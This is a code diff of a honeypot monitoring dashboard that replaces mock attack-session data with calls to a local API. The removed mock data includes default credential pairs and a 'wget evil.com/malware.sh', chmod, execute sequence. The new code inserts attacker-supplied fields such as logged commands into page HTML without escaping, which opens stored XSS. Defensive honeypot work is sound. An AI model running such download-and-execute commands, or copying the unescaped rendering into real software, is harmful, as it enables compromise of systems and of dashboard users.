@@ -160,7 +160,7 @@
                                 <span class="info-box-icon bg-info"><i class="far fa-clock"></i></span>
                                 <div class="info-box-content">
                                     <span class="info-box-text">Total Sessions</span>
-                                    <span class="info-box-number">1,245</span>
+                                    <span class="info-box-number" id="statTotalSessions">-</span>
                                 </div>
                             </div>
                         </div>
@@ -169,7 +169,7 @@
                                 <span class="info-box-icon bg-success"><i class="fas fa-flag"></i></span>
                                 <div class="info-box-content">
                                     <span class="info-box-text">Countries</span>
-                                    <span class="info-box-number">47</span>
+                                    <span class="info-box-number" id="statCountries">-</span>
                                 </div>
                             </div>
                         </div>
@@ -178,7 +178,7 @@
                                 <span class="info-box-icon bg-warning"><i class="fas fa-terminal"></i></span>
                                 <div class="info-box-content">
                                     <span class="info-box-text">Avg Duration</span>
-                                    <span class="info-box-number">2.4 min</span>
+                                    <span class="info-box-number" id="statAvgDur">-</span>
                                 </div>
                             </div>
                         </div>
@@ -187,7 +187,7 @@
                                 <span class="info-box-icon bg-danger"><i class="fas fa-skull-crosswalk"></i></span>
                                 <div class="info-box-content">
                                     <span class="info-box-text">High Risk</span>
-                                    <span class="info-box-number">23</span>
+                                    <span class="info-box-number" id="statHighRisk">-</span>
                                 </div>
                             </div>
                         </div>
@@ -298,148 +298,7 @@
                                         <th>Actions</th>
                                     </tr>
                                 </thead>
-                                <tbody>
-                                    <tr>
-                                        <td>SESS-001</td>
-                                        <td>2024-01-15 14:23:45</td>
-                                        <td>185.142.53.12</td>
-                                        <td>Russia 🇷🇺</td>
-                                        <td>SSH Brute Force</td>
-                                        <td>22</td>
-                                        <td>2 min 34 sec</td>
-                                        <td>156</td>
-                                        <td><span class="badge badge-high">High</span></td>
-                                        <td>
-                                            <button class="btn btn-xs btn-info" onclick="viewSession('SESS-001')">
-                                                <i class="fas fa-eye"></i> View
-                                            </button>
-                                            <button class="btn btn-xs btn-warning"
-                                                onclick="showRemediation('SESS-001')">
-                                                <i class="fas fa-shield-alt"></i>
-                                            </button>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td>SESS-002</td>
-                                        <td>2024-01-15 14:15:22</td>
-                                        <td>103.112.45.78</td>
-                                        <td>China 🇨🇳</td>
-                                        <td>HTTP Directory Scan</td>
-                                        <td>80</td>
-                                        <td>1 min 12 sec</td>
-                                        <td>89</td>
-                                        <td><span class="badge badge-medium">Medium</span></td>
-                                        <td>
-                                            <button class="btn btn-xs btn-info" onclick="viewSession('SESS-002')">
-                                                <i class="fas fa-eye"></i> View
-                                            </button>
-                                            <button class="btn btn-xs btn-warning"
-                                                onclick="showRemediation('SESS-002')">
-                                                <i class="fas fa-shield-alt"></i>
-                                            </button>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td>SESS-003</td>
-                                        <td>2024-01-15 14:02:11</td>
-                                        <td>45.125.67.89</td>
-                                        <td>Brazil 🇧🇷</td>
-                                        <td>FTP Anonymous Login</td>
-                                        <td>21</td>
-                                        <td>3 min 45 sec</td>
-                                        <td>234</td>
-                                        <td><span class="badge badge-low">Low</span></td>
-                                        <td>
-                                            <button class="btn btn-xs btn-info" onclick="viewSession('SESS-003')">
-                                                <i class="fas fa-eye"></i> View
-                                            </button>
-                                            <button class="btn btn-xs btn-warning"
-                                                onclick="showRemediation('SESS-003')">
-                                                <i class="fas fa-shield-alt"></i>
-                                            </button>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td>SESS-004</td>
-                                        <td>2024-01-15 13:45:33</td>
-                                        <td>91.234.56.78</td>
-                                        <td>Ukraine 🇺🇦</td>
-                                        <td>MySQL Injection</td>
-                                        <td>3306</td>
-                                        <td>4 min 21 sec</td>
-                                        <td>312</td>
-                                        <td><span class="badge badge-high">High</span></td>
-                                        <td>
-                                            <button class="btn btn-xs btn-info" onclick="viewSession('SESS-004')">
-                                                <i class="fas fa-eye"></i> View
-                                            </button>
-                                            <button class="btn btn-xs btn-warning"
-                                                onclick="showRemediation('SESS-004')">
-                                                <i class="fas fa-shield-alt"></i>
-                                            </button>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td>SESS-005</td>
-                                        <td>2024-01-15 13:30:12</td>
-                                        <td>197.156.89.12</td>
-                                        <td>Egypt 🇪🇬</td>
-                                        <td>Telnet Scan</td>
-                                        <td>23</td>
-                                        <td>45 sec</td>
-                                        <td>23</td>
-                                        <td><span class="badge badge-medium">Medium</span></td>
-                                        <td>
-                                            <button class="btn btn-xs btn-info" onclick="viewSession('SESS-005')">
-                                                <i class="fas fa-eye"></i> View
-                                            </button>
-                                            <button class="btn btn-xs btn-warning"
-                                                onclick="showRemediation('SESS-005')">
-                                                <i class="fas fa-shield-alt"></i>
-                                            </button>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td>SESS-006</td>
-                                        <td>2024-01-15 13:12:08</td>
-                                        <td>82.115.23.45</td>
-                                        <td>Poland 🇵🇱</td>
-                                        <td>RDP Brute Force</td>
-                                        <td>3389</td>
-                                        <td>5 min 12 sec</td>
-                                        <td>423</td>
-                                        <td><span class="badge badge-high">High</span></td>
-                                        <td>
-                                            <button class="btn btn-xs btn-info" onclick="viewSession('SESS-006')">
-                                                <i class="fas fa-eye"></i> View
-                                            </button>
-                                            <button class="btn btn-xs btn-warning"
-                                                onclick="showRemediation('SESS-006')">
-                                                <i class="fas fa-shield-alt"></i>
-                                            </button>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td>SESS-007</td>
-                                        <td>2024-01-15 12:58:34</td>
-                                        <td>41.78.12.67</td>
-                                        <td>Kenya 🇰🇪</td>
-                                        <td>HTTP SQLi</td>
-                                        <td>443</td>
-                                        <td>2 min 08 sec</td>
-                                        <td>67</td>
-                                        <td><span class="badge badge-medium">Medium</span></td>
-                                        <td>
-                                            <button class="btn btn-xs btn-info" onclick="viewSession('SESS-007')">
-                                                <i class="fas fa-eye"></i> View
-                                            </button>
-                                            <button class="btn btn-xs btn-warning"
-                                                onclick="showRemediation('SESS-007')">
-                                                <i class="fas fa-shield-alt"></i>
-                                            </button>
-                                        </td>
-                                    </tr>
-                                </tbody>
+                                <tbody id="sessionsTableBody"></tbody>
                             </table>
                         </div>
                     </div>
@@ -512,28 +371,9 @@
                                                 </div>
                                                 <div class="card-body">
                                                     <table class="table table-bordered">
-                                                        <tr>
-                                                            <th>GeoIP Location</th>
-                                                            <td><span class="badge badge-success">Enriched</span></td>
-                                                        </tr>
-                                                        <tr>
-                                                            <th>VirusTotal</th>
-                                                            <td><span class="badge badge-danger">3/60 malicious</span>
-                                                            </td>
-                                                        </tr>
-                                                        <tr>
-                                                            <th>AbuseIPDB</th>
-                                                            <td><span class="badge badge-warning">Reported 5x</span>
-                                                            </td>
-                                                        </tr>
-                                                        <tr>
-                                                            <th>Threat Category</th>
-                                                            <td>Brute Force Bot</td>
-                                                        </tr>
-                                                        <tr>
-                                                            <th>Confidence Score</th>
-                                                            <td>85%</td>
-                                                        </tr>
+                                                        <tbody id="detailEnrichment">
+                                                            <tr><td colspan="2" class="text-center text-muted"><i class="fas fa-spinner fa-spin"></i></td></tr>
+                                                        </tbody>
                                                     </table>
                                                 </div>
                                             </div>
@@ -545,16 +385,7 @@
                                             <h5 class="card-title">Commands Executed / Payloads</h5>
                                         </div>
                                         <div class="card-body">
-                                            <pre><code>root:password123
-admin:admin
-user:123456
-test:test
-ubuntu:ubuntu
-deploy:deploy
-mysql -u root -p
-wget http://evil.com/malware.sh
-chmod +x malware.sh
-./malware.sh</code></pre>
+                                            <pre><code id="detailCommands">No data yet.</code></pre>
                                         </div>
                                     </div>
 
@@ -563,26 +394,14 @@ chmod +x malware.sh
                                             <h5 class="card-title">Timeline of Events</h5>
                                         </div>
                                         <div class="card-body">
-                                            <ul class="timeline">
-                                                <li><i class="fa fa-clock bg-info"></i> 14:23:45 - Connection
-                                                    established</li>
-                                                <li><i class="fa fa-clock bg-info"></i> 14:23:46 - SSH login attempt:
-                                                    root/password123</li>
-                                                <li><i class="fa fa-clock bg-info"></i> 14:23:47 - SSH login attempt:
-                                                    admin/admin</li>
-                                                <li><i class="fa fa-clock bg-warning"></i> 14:23:50 - Multiple failures
-                                                    detected</li>
-                                                <li><i class="fa fa-clock bg-info"></i> 14:24:15 - Downloaded file from
-                                                    external URL</li>
-                                                <li><i class="fa fa-clock bg-danger"></i> 14:24:20 - Malicious command
-                                                    executed</li>
-                                                <li><i class="fa fa-clock bg-info"></i> 14:26:19 - Session ended</li>
+                                            <ul class="timeline" id="detailTimeline">
+                                                <li class="text-muted">Loading...</li>
                                             </ul>
                                         </div>
                                     </div>
                                 </div>
                                 <div class="modal-footer">
-                                    <button class="btn btn-warning" onclick="blockIP()">
+                                    <button class="btn btn-warning" id="blockIPBtn" onclick="blockIP()">
                                         <i class="fas fa-ban"></i> Block IP
                                     </button>
                                     <button class="btn btn-primary" onclick="exportSession()">
@@ -644,37 +463,188 @@ chmod +x malware.sh
     <script src="dist/js/adminlte.min.js"></script>
 
     <script>
-        $(document).ready(function () {
-            // Initialize DataTable
-            $("#sessionsTable").DataTable({
-                "responsive": true,
-                "lengthChange": true,
-                "autoWidth": false,
-                "order": [[1, 'desc']], // Sort by timestamp descending
-                "pageLength": 25
-            });
-        });
+        const API_BASE = 'http://localhost:8000';
 
-        function viewSession(sessionId) {
-            $('#sessionIdDisplay').text(sessionId);
-            $('#sessionDetailModal').modal('show');
+        // Auth guard
+        const token = localStorage.getItem('hd_token');
+        if (!token) { window.location.href = 'login.html'; }
+
+        function authHeaders() {
+            return { 'Authorization': 'Bearer ' + token };
         }
 
-        function showRemediation(sessionId) {
+        async function apiFetch(path) {
+            const r = await fetch(API_BASE + path, { headers: authHeaders() });
+            if (r.status === 401) { localStorage.removeItem('hd_token'); window.location.href = 'login.html'; }
+            return r.json();
+        }
+
+        function sevBadge(sev) {
+            return `<span class="badge badge-${sev}">${sev.charAt(0).toUpperCase()+sev.slice(1)}</span>`;
+        }
+
+        function buildRow(s) {
+            const ts = s.start_time ? new Date(s.start_time).toLocaleString() : '-';
+            const country = s.country || '-';
+            return `<tr>
+                <td><code style="font-size:11px">${s.session_id}</code></td>
+                <td>${ts}</td>
+                <td><code>${s.src_ip}</code></td>
+                <td>${country}</td>
+                <td>${s.attack_type || '-'}</td>
+                <td>${s.dst_port || '-'}</td>
+                <td>${s.duration_display || '-'}</td>
+                <td>${s.login_attempts || 0}</td>
+                <td>${sevBadge(s.severity || 'low')}</td>
+                <td>
+                    <button class="btn btn-xs btn-info" onclick="viewSession('${s.session_id}')">
+                        <i class="fas fa-eye"></i> View
+                    </button>
+                    <button class="btn btn-xs btn-warning" onclick="showRemediation()">
+                        <i class="fas fa-shield-alt"></i>
+                    </button>
+                </td>
+            </tr>`;
+        }
+
+        var sessionsTable;
+
+        $(document).ready(function () {
+            sessionsTable = $("#sessionsTable").DataTable({
+                responsive: true,
+                lengthChange: true,
+                autoWidth: false,
+                order: [[1, 'desc']],
+                pageLength: 25,
+                processing: true,
+                language: { processing: '<i class="fas fa-spinner fa-spin"></i> Loading...' }
+            });
+
+            loadSessions();
+        });
+
+        async function loadSessions() {
+            try {
+                const d = await apiFetch('/api/sessions?limit=100&offset=0');
+                sessionsTable.clear();
+                if (d.items && d.items.length > 0) {
+                    d.items.forEach(s => sessionsTable.row.add($(buildRow(s))[0]));
+                    // Update stat boxes
+                    $('#statTotalSessions').text(d.total.toLocaleString());
+                    const countries = new Set(d.items.filter(s => s.country).map(s => s.country));
+                    $('#statCountries').text(countries.size);
+                    const highRisk = d.items.filter(s => s.severity === 'high').length;
+                    $('#statHighRisk').text(highRisk);
+                    const withDur = d.items.filter(s => s.duration_secs);
+                    if (withDur.length) {
+                        const avg = withDur.reduce((a, s) => a + s.duration_secs, 0) / withDur.length;
+                        $('#statAvgDur').text((avg / 60).toFixed(1) + ' min');
+                    }
+                }
+                sessionsTable.draw();
+            } catch(e) {
+                console.error('Failed to load sessions', e);
+            }
+        }
+
+        async function viewSession(sessionId) {
+            $('#sessionIdDisplay').text(sessionId);
+            // Clear and show loading state
+            $('#detailSessionId').text('Loading...');
+            $('#detailTimestamp, #detailSourceIP, #detailCountry, #detailCity, #detailISP').text('-');
+            $('#detailAttackType, #detailPort, #detailDuration, #detailEvents').text('-');
+            $('#detailEnrichment').html('<tr><td colspan="2"><i class="fas fa-spinner fa-spin"></i></td></tr>');
+            $('#detailTimeline').empty();
+            $('#detailCommands').text('');
+            $('#sessionDetailModal').modal('show');
+
+            try {
+                const d = await apiFetch('/api/sessions/' + encodeURIComponent(sessionId));
+                const s = d.session;
+
+                $('#detailSessionId').text(s.session_id);
+                $('#detailTimestamp').text(s.start_time ? new Date(s.start_time).toLocaleString() : '-');
+                $('#detailSourceIP').text(s.src_ip);
+                $('#detailCountry').text(s.country || '-');
+                $('#detailCity').text(s.city || '-');
+                $('#detailISP').text(s.isp || '-');
+                $('#detailAttackType').text(s.attack_type || '-');
+                $('#detailPort').text(s.dst_port || '-');
+                $('#detailDuration').text(s.duration_display || '-');
+                $('#detailEvents').text(d.events.length);
+
+                // Enrichment card
+                const vtScore = s.vt_malicious != null
+                    ? `<span class="badge badge-${s.vt_malicious >= 3 ? 'danger' : s.vt_malicious >= 1 ? 'warning' : 'success'}">${s.vt_malicious}/${s.vt_total || '?'} malicious</span>`
+                    : '<span class="badge badge-secondary">Not checked</span>';
+                const geoStatus = s.country
+                    ? `<span class="badge badge-success">Enriched</span>`
+                    : `<span class="badge badge-secondary">${s.enrichment_status}</span>`;
+                $('#detailEnrichment').html(`
+                    <tr><th>GeoIP Location</th><td>${geoStatus}</td></tr>
+                    <tr><th>VirusTotal</th><td>${vtScore}</td></tr>
+                    <tr><th>Login Attempts</th><td>${s.login_attempts}</td></tr>
+                    <tr><th>Login Success</th><td>${s.login_success ? '<span class="badge badge-danger">YES</span>' : 'No'}</td></tr>
+                    <tr><th>Commands Run</th><td>${s.commands_run}</td></tr>
+                    <tr><th>Files Downloaded</th><td>${s.files_downloaded}</td></tr>
+                `);
+
+                // Commands & payloads
+                const cmds = d.events.filter(e => e.command_input || e.download_url);
+                if (cmds.length) {
+                    $('#detailCommands').text(cmds.map(e => e.command_input || ('DOWNLOAD: ' + e.download_url)).join('\n'));
+                } else {
+                    $('#detailCommands').text('No commands or downloads recorded.');
+                }
+
+                // Timeline
+                const tlHtml = d.events.map(e => {
+                    const t = e.timestamp ? new Date(e.timestamp).toLocaleTimeString() : '';
+                    const icon = e.severity === 'high' ? 'bg-danger' : e.severity === 'medium' ? 'bg-warning' : 'bg-info';
+                    const label = e.event_id.replace('cowrie.', '');
+                    const extra = e.username ? ` (${e.username}/${e.password || ''})` : (e.command_input ? `: ${e.command_input.substring(0,40)}` : '');
+                    return `<li><i class="fa fa-clock ${icon}"></i> ${t} — ${label}${extra}</li>`;
+                }).join('');
+                $('#detailTimeline').html(tlHtml || '<li>No events</li>');
+
+                // Store current IP for block button
+                $('#blockIPBtn').data('ip', s.src_ip);
+
+            } catch(e) {
+                $('#detailSessionId').text('Error loading session');
+            }
+        }
+
+        function showRemediation() {
             $('#remediationModal').modal('show');
         }
 
         function exportSessions() {
-            alert('Exporting sessions...');
+            apiFetch('/api/sessions?limit=1000&offset=0').then(d => {
+                const rows = [['Session ID','Start Time','Source IP','Country','Attack Type','Port','Duration','Login Attempts','Severity']];
+                d.items.forEach(s => rows.push([s.session_id, s.start_time, s.src_ip, s.country||'', s.attack_type||'', s.dst_port||'', s.duration_display||'', s.login_attempts, s.severity]));
+                const csv = rows.map(r => r.join(',')).join('\n');
+                const a = document.createElement('a');
+                a.href = 'data:text/csv,' + encodeURIComponent(csv);
+                a.download = 'sessions_export.csv';
+                a.click();
+            });
         }
 
         function blockIP() {
-            alert('IP blocked successfully!');
-            $('#sessionDetailModal').modal('hide');
+            const ip = $('#blockIPBtn').data('ip');
+            alert('To block ' + ip + ', add it to your firewall:\n\niptables -A INPUT -s ' + ip + ' -j DROP');
         }
 
         function exportSession() {
-            alert('Session exported successfully!');
+            const sid = $('#sessionIdDisplay').text();
+            apiFetch('/api/sessions/' + encodeURIComponent(sid)).then(d => {
+                const json = JSON.stringify(d, null, 2);
+                const a = document.createElement('a');
+                a.href = 'data:application/json,' + encodeURIComponent(json);
+                a.download = sid + '.json';
+                a.click();
+            });
         }
     </script>
 </body>
